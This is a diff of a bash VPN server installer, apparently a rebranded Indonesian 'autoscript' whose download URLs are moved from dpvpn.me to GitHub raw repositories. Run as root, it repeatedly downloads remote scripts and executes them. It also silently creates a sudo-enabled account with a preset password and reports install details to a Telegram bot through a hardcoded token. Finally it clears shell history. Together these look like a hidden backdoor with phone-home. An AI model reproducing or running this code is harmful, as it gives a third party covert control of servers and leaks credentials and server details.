@@ -13,7 +13,7 @@ yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
 green() { echo -e "\\033[32;1m${*}\\033[0m"; }
 red() { echo -e "\\033[31;1m${*}\\033[0m"; }
 # domain random
-CDN="https://dpvpn.me/ssh"
+CDN="https://raw.githubusercontent.com/scriswan/premiumsc/main/ssh"
 cd /root
 if [ "${EUID}" -ne 0 ]; then
 echo "You need to run this script as root"
@@ -125,7 +125,7 @@ echo -ne "[ ${green}INFO${NC} ] Check permission : "
 mkdir -p /var/lib/SIJA >/dev/null 2>&1
 echo "IP=" >> /var/lib/SIJA/ipvps.conf
 echo ""
-wget -q https://dpvpn.me/tools.sh;chmod +x tools.sh;./tools.sh
+wget -q https://raw.githubusercontent.com/scriswan/premiumsc/main/tools.sh;chmod +x tools.sh;./tools.sh
 rm tools.sh
 clear
 echo " "
@@ -166,7 +166,7 @@ fi
 # Inisialisasi
 MYIP=$(curl -sS ipv4.icanhazip.com)
 # Perizinan Sc & Pemanggilan username
-izinsc="https://dpvpn.me/register"
+izinsc="https://raw.githubusercontent.com/FathirAmanda/FathirAmanda.github.io/refs/heads/main/register"
 rm -f /usr/bin/user
 username=$(curl $izinsc | grep $MYIP | awk '{print $2}')
 echo "$username" >/usr/bin/user
@@ -188,11 +188,11 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="1002196928254"
+CHATID="5521096873"
 KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Instalasi Autoscript-vvip V2.5
+TEXT="INSTAL SCRIPTS R2 V2.5
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <code>Username   :</code> <code>$Name</code>
 <code>Domain     :</code> <code>$domain</code>
@@ -202,10 +202,10 @@ TEXT="Instalasi Autoscript-vvip V2.5
 <code>Location   :</code> <code>$CITY</code>
 <code>Exp Sc.    :</code> <code>$Exp</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
-By Admin @Riswanvpnstore
+By Admin @R23_VPNSTORE
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <i>Notifications Automatic From Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/Riswanvpnstore"},{"text":"Contack","url":"https://wa.me/6285888801241"}]]}'
+"'&reply_markup={"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/R23_VPNSTORE"},{"text":"Contack","url":"https://wa.me/6285888801241"}]]}'
 
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
@@ -214,14 +214,14 @@ echo -e "$green      Install SSH / WS               $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-wget https://dpvpn.me/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+wget https://raw.githubusercontent.com/scriswan/premiumsc/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install BACKUP               $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-wget https://dpvpn.me/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
+wget https://raw.githubusercontent.com/scriswan/premiumsc/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
 clear
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
@@ -229,15 +229,15 @@ echo -e "$green          Install XRAY              $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-wget https://dpvpn.me/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
-wget https://dpvpn.me/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
+wget https://raw.githubusercontent.com/scriswan/premiumsc/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
+wget https://raw.githubusercontent.com/scriswan/premiumsc/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green          Install SLOWDNS              $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-wget -q -O slow.sh https://dpvpn.me/slow.sh && chmod +x slow.sh && ./slow.sh
+wget -q -O slow.sh https://raw.githubusercontent.com/scriswan/premiumsc/main/slow.sh && chmod +x slow.sh && ./slow.sh
 clear
 cat> /root/.profile << END
 if [ "$BASH" ]; then
@@ -260,7 +260,7 @@ if [ ! -f "/etc/log-create-user.log" ]; then
 echo "Log All Account " > /etc/log-create-user.log
 fi
 history -c
-serverV=$( curl -sS https://dpvpn.me/version )
+serverV=$( curl -sS https://raw.githubusercontent.com/scriswan/premiumsc/main/version )
 echo $serverV > /opt/.ver
 aureb=$(cat /home/re_otm)
 b=11
